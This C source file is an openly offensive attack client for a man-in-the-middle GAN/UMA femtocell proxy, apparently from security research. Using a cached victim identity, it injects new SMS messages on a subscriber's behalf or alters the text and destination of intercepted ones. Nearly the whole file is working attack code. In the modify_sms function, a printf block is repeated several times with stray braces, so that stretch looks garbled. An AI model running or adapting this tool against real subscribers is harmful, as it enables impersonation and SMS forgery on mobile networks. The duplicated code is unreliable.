/*
 * client to interact with GAN proxy and allow to
 * modify SMS content or inject new SMS messages on behalf of a subscriber
 *
 * -------------------------------------------------------------------------
 * "THE BEER-WARE LICENSE" (Revision 42):
 * Nico Golde <nico@ngolde.de> wrote this file. As long as you retain this
 * notice you can do whatever you want with this stuff. If we meet some day,
 * and you think this stuff is worth it, you can buy me a beer in return.
 * -------------------------------------------------------------------------
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include "uma_msg.h"
#include "ga_types.h"
#include "iei_types.h"
#include "osmocom_helper.h"
#include "decode_submit.h"
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <osmocom/gsm/gsm_utils.h>
#include <osmocom/gsm/gsm48_ie.h>
#include <osmocom/gsm/protocol/gsm_04_08.h>
#include <osmocom/gsm/protocol/gsm_04_11.h>
#include <osmocom/core/msgb.h>

#define UMA_PORT 14002

typedef struct attack {
	char *dest;
	char *text;
	int type;
	int sock;
} attack_t;

enum attack_types {
	ATTACK_INJECT,
	ATTACK_MODIFY,
};

void usage(char *arg, char *error){
	if(error){
		fprintf(stderr, "ERROR:\n%s\n", error);
		exit(EXIT_FAILURE);
	}

	printf("%s [options]\n\n"
			"-h display this help...\n"
			"-p <proxy ip>\n"
			"-a <attack>\n"
			"-t <sms text>\n"
			"-d <destination number>\n\n"
			"attack can be either 'm' (modify), 'i' (inject new)\n", arg);
	exit(EXIT_SUCCESS);
}

struct uma_msg_s *proxy_reply(int sock, uint8_t type){
	struct uma_msg_s *uma_msg;
	uint8_t buf[2048];
	ssize_t s;
	
	if(-1 == (s = read(sock, buf, sizeof(buf) - 1))){
		perror("read()");
		return NULL;
	}

	if(0 == s){
		fprintf(stderr, "Proxy closed connection.. boOm? :D\n");
		return NULL;
	}

	uma_msg = uma_parse_msg(buf, s);
	if(!uma_msg) return NULL;

	if(uma_msg->pd != type){
		fprintf(stderr, "Received msg (%d) doesn't match expected protocol descriptor (%d)\n", uma_msg->pd, type);
		return NULL;
	}

	if(GA_PROXY == uma_msg->pd){
		if(uma_msg->msgtype < sizeof(ga_proxy)/40){
			printf("Received %s from proxy\n", ga_proxy[uma_msg->msgtype]);
		} else {
			fprintf(stderr, "Received unknown msg type from proxy (%d)\n", uma_msg->msgtype);
			return NULL;
		}
	}

	return uma_msg;
}

uint8_t *handle_id_reply(struct uma_msg_s *uma_msg){
	uint32_t len;
	int i;
	if(!uma_msg){
		fprintf(stderr, "Didn't receive a reply from proxy\n");
		return NULL;
	}

	if(uma_msg->ntlv != 1){
		fprintf(stderr, "Proxy reply should only contain 1 TLV (contains %d)\n", uma_msg->ntlv);
		return NULL;
	}

	len = tlv_get_len(uma_msg->tlv[0]);
	if(len != 4 && len != 8){
		fprintf(stderr, "reply doesn't match proper length (%d)\n", len);
		return NULL;
	}

	printf("received info reply: ");
	for(i=0;i<len;i++){
		printf("%2x ", uma_msg->tlv[0][i+2]);
	}
	printf("\n");

	return uma_msg->tlv[0];
}

int ga_csr_request(int sock){
	struct uma_msg_s *uma_msg;
	u_int8_t *titi, *tata;
	int j, i, len = 0;
	uma_msg = uma_create_msg(GA_CSR_REQUEST ,0, GA_CSR);
	uma_msg->tlv[uma_msg->ntlv++] = create_IEI_Establishment_Cause(16);
	j = uma_create_buffer(&titi, uma_msg);

	printf("Sending GA-CSR REQUEST\n");
	write(sock, titi, j);
	uma_delete_msg(uma_msg);

	uma_msg = proxy_reply(sock, GA_CSR);
	if(!uma_msg){
		return -1;
	}

	if(uma_msg->msgtype != GA_CSR_REQUEST_ACCEPT){
		fprintf(stderr, "Expected GA_CSR_REQUEST_ACCEPT(%d) but got %s(%d)\n", GA_CSR_REQUEST_ACCEPT, ga_rc_csr[uma_msg->msgtype], uma_msg->msgtype);
		uma_delete_msg(uma_msg);
		return -2;
	}

	uma_delete_msg(uma_msg);
	return 0;
}

int ga_csr_uplink_dtap(int sock, uint8_t *id, uint8_t id_len){
	struct uma_msg_s *uma_msg;
	u_int8_t *titi, *tata;
	int j, i, len = 0;
	struct gsm48_service_request *nsr;
	struct gsm48_hdr *ngh;
	struct msgb *nmsg;
	uint8_t *cm2lv;
	uint8_t buf[11];

	nmsg = gsm48_l3_msgb_alloc();
	if (!nmsg){
		return -1;
	}
	ngh = (struct gsm48_hdr *)msgb_put(nmsg, sizeof(*ngh));
	nsr = (struct gsm48_service_request *)msgb_put(nmsg, sizeof(*nsr));
	cm2lv = (uint8_t *)&nsr->classmark;

	ngh->proto_discr = GSM48_PDISC_MM;
	ngh->msg_type = GSM48_MT_MM_CM_SERV_REQ;

	/* type and key */
	nsr->cm_service_type = GSM48_CMSERV_SMS;
	nsr->cipher_key_seq = 1;

	/* classmark 2 */
	cm2lv[0] = sizeof(struct gsm48_classmark2);
	gsm48_gen_classmark2((struct gsm48_classmark2 *)(cm2lv + 1));

	gsm48_encode_mi(buf, id, id_len);

	msgb_put(nmsg, buf[0]);
	memcpy(&nsr->mi_len, buf, id_len+2);

	uma_msg = uma_create_msg(GA_CSR_UPLINK_DIRECT_TRANSFER, 0, GA_CSR);
	uma_msg->tlv[uma_msg->ntlv++] = create_IEI_Establishment_Cause(16);
	uma_msg->tlv[uma_msg->ntlv++] = create_IEI_L3_Message(nmsg->data, nmsg->len);
	j = uma_create_buffer(&titi, uma_msg);

	printf("Sending GA-CSR UPLINK DIRECT TRANSFER\n");
	write(sock, titi, j);
	uma_delete_msg(uma_msg);

	msgb_free(nmsg);

	return 0;
}

int gsm340_gen_da(uint8_t *da, uint8_t da_len, char *dest){
	int len_in_bytes;
	
	da[1] = 0x81; /* no extension, type unknown, isdn/telephone */
	len_in_bytes = gsm48_encode_bcd_number(da, da_len, 1, dest);

	/* GSM 03.40 length in useful semi-octets */
	da[0] = strlen(dest) & 0xff;

	return len_in_bytes;
}

int gsm340_tpdu_encode(struct msgb *msg, struct gsm_sms *sms){
	uint8_t *smsp;
	uint8_t da_len;
	uint8_t da[12]; /* max len referring to GSM 03.40 */
	unsigned int old_msg_len = msg->len;

	smsp = msgb_put(msg, 1);
	/* first octet with masked bit */
	*smsp = GSM340_SMS_SUBMIT_MS2SC;

	if(sms->validity_period){
		*smsp |= (1 << 4);
	}

	*smsp |= (sms->ud_hdr_ind << 6);
	*smsp |= (sms->status_rep_req << 5);
	*smsp |= (sms->reply_path_req << 7);

	/* TP-MR */
	smsp = msgb_put(msg, 1);
	*smsp = sms->msg_ref;

	/* TP-DA */
	da_len = gsm340_gen_da(da, sizeof(da), sms->dest_addr);
	smsp = msgb_put(msg, da_len);
	memcpy(smsp, da, da_len);

	/* TP-PID */
	smsp = msgb_put(msg, 1);
	*smsp = sms->protocol_id;

	/* TP-DCS */
	smsp = msgb_put(msg, 1);
	*smsp = sms->data_coding_scheme;

	/* TP-VP */
	smsp = msgb_put(msg, 1);
	*smsp = sms->validity_period;

	/* TP-UDL */
	smsp = msgb_put(msg, 1);
	*smsp = sms->user_data_len;

	/* TP-UD */
	smsp = msgb_put(msg, sms->user_data_len);
	memcpy(smsp, sms->user_data, sms->user_data_len);

	return msg->len - old_msg_len;
}

int ga_csr_uplink_dtap_sms(int sock, char *dest, char *text, uint8_t tpdu_mr, uint8_t rpdu_mr){
	struct uma_msg_s *uma_msg;
	u_int8_t *titi, *tata;
	int j, i, len;
	struct gsm48_hdr *ngh;
	struct gsm411_rp_hdr *rph;
	struct msgb *nmsg;
	struct gsm_sms *sms = malloc(sizeof(struct gsm_sms));
	uint8_t *data;
	uint8_t oa[12];
	uint8_t oa_len;
	uint8_t *rp_ud_len;

	if(strlen(dest) >= sizeof(sms->dest_addr)){
		fprintf(stderr, "Broken destination number\n");
		return -2;
	}

	memset(sms, 0, sizeof(struct gsm_sms));

	sms->validity_period = 0xff;
	sms->status_rep_req = 0;
	sms->ud_hdr_ind = 0;
	sms->protocol_id = 0;
	sms->data_coding_scheme = 0;
	sms->reject_duplicates = 0;
	sms->msg_ref = tpdu_mr;
	sms->user_data_len =  gsm_7bit_encode(sms->user_data, text);
	/* workaround that libosmocore is currently returning the number of
	   encoded octets and not septets
	*/
	sms->user_data_len = (sms->user_data_len*8)/7;
	strncpy(sms->dest_addr, dest, sizeof(sms->dest_addr) - 1);

	nmsg = gsm411_msgb_alloc();
	if (!nmsg){
		return -1;
	}
	rph = (struct gsm411_rp_hdr *)msgb_push(nmsg, sizeof(*rph));
	rph->msg_type = GSM411_MT_RP_DATA_MO;
	rph->msg_ref = rpdu_mr;

	data = (u_int8_t *)msgb_put(nmsg, 1);
	data[0] = 0;

	/* hardcode smsc address for now */
	data = (u_int8_t *)msgb_put(nmsg, 8);
	data[0] = 0x07;
	data[1] = 0x91;
	data[2] = 0x33;
	data[3] = 0x06;
	data[4] = 0x09;
	data[5] = 0x10;
	data[6] = 0x93;
	data[7] = 0xf0;

	ngh = (struct gsm48_hdr *) msgb_push(nmsg, sizeof(*ngh));

	ngh->proto_discr = GSM48_PDISC_SMS;
	ngh->msg_type = GSM411_MT_CP_DATA;

	data = msgb_put(nmsg, 1);
	rp_ud_len = data;

	*rp_ud_len = gsm340_tpdu_encode(nmsg, sms);
	/* substract rpdu length, type and ref from total length */
	rph->len = nmsg->len - 3;

	uma_msg = uma_create_msg(GA_CSR_UPLINK_DIRECT_TRANSFER, 0, GA_CSR);
	uma_msg->tlv[uma_msg->ntlv++] = create_IEI_L3_Message(nmsg->data, nmsg->len);
	j = uma_create_buffer(&titi, uma_msg);

	printf("Sending GA-CSR UPLINK DIRECT TRANSFER CP-DATA RP-DATA...");
	write(sock, titi, j);
	printf("passed to proxy\n");
	// there seems to be a memory corruption in libosmocore/libuma, hence not freeing even though i should :/
	//uma_delete_msg(uma_msg);
	//msgb_free(nmsg);

	return 0;
}


int send_sms(int sock, unsigned char *dest, unsigned  char *text){
	struct uma_msg_s *uma_msg;
	u_int8_t *titi, *tata;
	int j, i, len = 0;
	int rc = -1;
	uint8_t *tlv;

	uma_msg = uma_create_msg(GA_PROXY_GET_ID, 0, GA_PROXY);
	j = uma_create_buffer(&titi,uma_msg);

	for(i = 0; i < uma_msg->ntlv; i++){
		tlv_printf(uma_msg->tlv[i]);
	}

	printf("Requesting a fresh victim information...\n");
	write(sock, titi, j);
	uma_delete_msg(uma_msg);

	uma_msg = proxy_reply(sock, GA_PROXY);
	if(NULL == (tlv = handle_id_reply(uma_msg))){
		fprintf(stderr, "proxy hasn't cached subscriber info yet...\n");
		return -1;
	}

	if((rc = ga_csr_request(sock)) < 0){
		return rc;
	}

	/* skip type and length of tlv and pass tmsi as parameter */
	if((rc = ga_csr_uplink_dtap(sock, tlv+2, tlv_get_len(tlv))) < 0){
		return rc;
	}
	uma_delete_msg(uma_msg);

	printf("Waiting for AUTH COMPLETE message so we can continue MITM\n");
	uma_msg = proxy_reply(sock, GA_PROXY);
	if(!uma_msg){
		return -2;
	}
	if(uma_msg->msgtype != GA_PROXY_AUTH_COMPLETE){
		fprintf(stderr, "Expected GA_CSR_REQUEST_ACCEPT(%d) but got %s(%d)\n", GA_CSR_REQUEST_ACCEPT, ga_rc_csr[uma_msg->msgtype], uma_msg->msgtype);
		return -3;
	}
	printf("Received AUTH COMPLETE, continuing procedure\n");
	uma_delete_msg(uma_msg);

	if((rc = ga_csr_uplink_dtap_sms(sock, dest, text, 1, 1)) < 0){
		return rc;
	}

	return 0;
}

uint8_t *extract_tpdu(struct uma_msg_s *uma_msg, uint8_t *rpdu_ref){
	uint32_t l3_len, cp_len, len, tpdu_len;
	int i;
	uint8_t *ptr;
	uint8_t *tpdu = NULL;

	if(!uma_msg){
		fprintf(stderr, "Didn't receive a reply from proxy\n");
		return NULL;
	}

	if(uma_msg->ntlv != 1){
		fprintf(stderr, "Uplink message should only contain 1 TLV (contains %d)\n", uma_msg->ntlv);
		return NULL;
	}

	l3_len = tlv_get_len(uma_msg->tlv[0]);

	if(uma_msg->msgtype != GA_CSR_UPLINK_DIRECT_TRANSFER){
		fprintf(stderr, "Received UMA payload doesn't contain a UPLINK DTAP message\n");
		return NULL;
	}

	ptr = uma_msg->tlv[0];
	if(!ptr || *ptr != L3_Message){
		fprintf(stderr, "Uplink message does not contain L3 payload\n");
		return NULL;
	}

	printf("Received L3 message...\n", l3_len);
	for(i=0;i<l3_len;i++){
		printf("%2x ", uma_msg->tlv[0][i]);
	}
	printf("\n");

	/* skip IEI length */
	ptr += 2;
	if(!ptr || (*ptr & 0x0f) != GSM48_PDISC_SMS){
		fprintf(stderr, "Uplink message protocol descriptor doesn't match SMS message\n", *ptr);
		return NULL;
	}
	
	ptr++;
	if(!ptr || *ptr != GSM411_MT_CP_DATA){
		fprintf(stderr, "DTAP Short Message Service Type != CP-Data\n");
		return NULL;
	}
	ptr++;
	if(!ptr){
		return NULL;
	} else {
		cp_len = *ptr;
	}

	*rpdu_ref = *(ptr + 2);
	/* skip RP-DATA message type, reference, originating address (should be 0) */
	ptr += 4;
	
	if(!ptr){
		return NULL;
	} else {
		/* len of destination number */
		len = *ptr;
	}

	/* skip number, type, len */
	ptr += len + 1;
	if(!ptr){
		return NULL;
	} else {
		tpdu_len = *ptr;
	}
	ptr++;

	/* yes, we do not verify the length values and assume the
	   phone + femtocell properly encode SMS, excuse the lazyness
	*/
	tpdu = malloc(tpdu_len + 1);
	if(!tpdu){
		perror("malloc()");
		return NULL;
	}
	memcpy(tpdu, ptr, tpdu_len);
	tpdu[tpdu_len] = 0;

	return tpdu;
}

int modify_sms(int sock, unsigned char *dest, unsigned char *text){
	struct uma_msg_s *uma_msg;
	u_int8_t *titi, *tata;
	int j, i, len = 0;
	int rc = -1;
	uint8_t *tpdu, *ptr;
	uint8_t rpdu_mr;
	/* could be just one data type, but since I reuse my old submit decoder... */
	struct gsm_sms *sms;
	sms_t *csms;
	unsigned char *pdest, *ptext;

	uma_msg = uma_create_msg(GA_PROXY_GET_SMS, 0, GA_PROXY);
	j = uma_create_buffer(&titi,uma_msg);

	for(i = 0; i < uma_msg->ntlv; i++){
		tlv_printf(uma_msg->tlv[i]);
	}

	printf("Requesting SMS to be modified...\n");
	write(sock, titi, j);
	uma_delete_msg(uma_msg);

	uma_msg = proxy_reply(sock, GA_CSR);
	if(NULL == (tpdu = extract_tpdu(uma_msg, &rpdu_mr))){
		return -1;
	}

	if(NULL == (csms = malloc(sizeof(sms_t)))){
		perror("malloc()");
		return -2;
	}
	memset(csms, 0, sizeof(sms_t));
	if(NULL == (ptext = malloc(SMS_TEXT_SIZE))){
		perror("malloc()");
		return -2;
	}

	if(NULL == (ptr = parse_pdu_header(csms, tpdu))){
		fprintf(stderr, "Something went wrong while decoding the submit PDU\n");
		return -3;
	}
	for(i=0;i<csms->msisdn_l;i++){
		printf("%0.2x", csms->msisdn[i]);
	}
	printf("\n");{
		printf("%0.2x", csms->msisdn[i]);
	}
	printf("\n");{
		printf("%0.2x", csms->msisdn[i]);
	}
	printf("\n");{
		printf("%0.2x", csms->msisdn[i]);
	}
	printf("\n");{
		printf("%0.2x", csms->msisdn[i]);
	}
	printf("\n");{
		printf("%0.2x", csms->msisdn[i]);
	}
	printf("\n");{
		printf("%0.2x", csms->msisdn[i]);
	}
	printf("\n");
	pdest = decode_msisdn(csms->msisdn, csms->msisdn_l);

	/* workaround libosmocore bug to work with octets rather
	   than septets
	*/
	csms->tp_ud_l = csms->tp_ud_l * 7/8 + 1;
	gsm_7bit_decode(ptext, ptr, csms->tp_ud_l);
	printf("Original destination: %s\n", pdest);
	printf("Original text message: %s\n", ptext);

	if(dest){
		printf("Replacing destination number %s with %s\n", pdest, dest);
		pdest = dest;
	}
	if(text){
		printf("Replacing text '%s' with '%s'\n", ptext, text);
		free(ptext);
		ptext = text;
	}

	printf("Attempting to send modified SMS\n");
	rc = ga_csr_uplink_dtap_sms(sock, pdest, ptext, csms->msg_ref, rpdu_mr);

	uma_delete_msg(uma_msg);
	destroy_sms(csms);
	free(tpdu);

	return rc;
}

int start_attack(attack_t *a){
	int rc;

	switch(a->type){
	case ATTACK_INJECT:
		if(!a->dest || !a->text){
			fprintf(stderr, "This attack needs a text as well as a destination number\n");
			rc = -2;
		} else {
			if((rc = send_sms(a->sock, a->dest, a->text) < 0)){
				fprintf(stderr, "Error sending SMS (%d)\n", rc);
			} else {
				printf("SMS on its way :D\n");
			}
		}
		break;
	case ATTACK_MODIFY:
		if(!a->dest && !a->text){
			fprintf(stderr, "You either have to modify the destination or the text!\n");
			rc = -2;
		} else {
			if((rc = modify_sms(a->sock, a->dest, a->text)) < 0){
				fprintf(stderr, "Error modifying SMS (%d)\n", rc);
			}
		}
		break;
	default:
		fprintf(stderr, "Unknown attack (shouldn't happen)\n");
		rc = -3;
		break;
	}

	return rc;
}

int main(int argc, char **argv) {
	int sock;
	struct sockaddr_in cs;
	struct imsi *im;
	extern char *optarg;
	extern int optind, optopt;
	int option;
	char *proxy;
	attack_t a;

	a.dest = NULL;
	a.text = NULL;
	a.type = -1;

	while ((option = getopt(argc, argv, "hp:d:t:a:s:b")) != -1) {
		if (option == EOF)
			break;
		switch(option){
		case 'p':
			proxy = optarg;
			break;
		case 'd':
			a.dest = optarg;
			break;
		case 't':
			if(strlen(optarg) >= SMS_TEXT_SIZE){
				usage(argv[0], "SMS text exceeds maximum length");
			}
			a.text = optarg;
			break;
		case 'a':
			if(optarg[0] == 'i'){
				a.type = ATTACK_INJECT;
			} else if(optarg[0] == 'm'){
				a.type = ATTACK_MODIFY;
			} else {
				usage(argv[0], "unknown attack");
			}
			break;
		case 'h':
			usage(argv[0], NULL);
			break;
		case ':':
			fprintf(stderr, "Option -%c requires an operand\n", optopt);
			return -1;
			break;
		case '?':
			fprintf(stderr, "Unrecognized option: -%c\n", optopt);
			return -2;
			break;
		default:
			usage(argv[0], NULL);
			break;
		}
	}

	if(!proxy){
		usage(argv[0], "Specify a proxy IP first....");
	}

	if(-1 == a.type){
		usage(argv[0], "Please specify attack type...");
	}

	cs.sin_family = AF_INET;
	cs.sin_port = htons(UMA_PORT);
	cs.sin_addr.s_addr = inet_addr(proxy);
	if(-1 == cs.sin_addr.s_addr){
		fprintf(stderr, "address conversion failed\n");
		return -2;
	}

	if(-1 == (a.sock = socket(cs.sin_family, SOCK_STREAM, 0))){
		perror("socket()");
		return -3;
	}

	if(connect(a.sock, (struct sockaddr*) &cs, sizeof(struct sockaddr_in)) < 0){
		perror("connect()");
		return -4;
	}

	if(-1 == start_attack(&a)){
		fprintf(stderr, "Error performing attack\n");
		close(sock);
		return -1;
	}

	close(sock);

	return 0;
}
